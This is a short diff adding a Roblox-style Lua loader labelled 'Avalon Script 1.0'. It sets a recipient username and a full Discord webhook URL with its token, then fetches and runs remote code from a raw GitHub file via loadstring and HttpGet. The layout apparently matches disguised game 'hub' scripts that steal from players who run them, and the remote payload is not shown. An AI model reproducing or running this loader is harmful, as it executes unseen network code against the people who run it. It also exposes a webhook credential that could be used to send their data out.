@@ -1,0 +1,5 @@
+_G.Username = "AvalonGodss"
+_G.HubName = "Avalon Script 1.0"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1111299891310907402/1_iaEqefEdhWnaf5SM70IMutZC9mXZ2ToEIYVLNu6_v1dXmyj8C3GzdB4excNETBQ3IS"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
